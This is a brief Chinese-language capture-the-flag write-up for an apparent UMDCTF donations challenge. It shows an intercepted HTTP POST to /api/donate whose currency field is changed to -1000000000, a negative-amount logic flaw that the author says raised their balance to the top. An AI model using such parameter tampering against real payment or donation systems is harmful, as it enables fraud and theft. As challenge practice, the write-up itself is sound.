直接抓包修改捐赠为负数？

```
POST /api/donate HTTP/2
Host: donations-api.challs.umdctf.io
Cookie: session=eyJ1c2VybmFtZSI6ICJjeW55NjY2In0=.Zi9_nQ.5IQX7WgUNQiUViUduSx7EE4OQTQ
Content-Length: 35
Sec-Ch-Ua: 
Sec-Ch-Ua-Platform: ""
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://donations.challs.umdctf.io
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://donations.challs.umdctf.io/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

to=lisanalgaib&currency=-1000000000
```

然后就最大了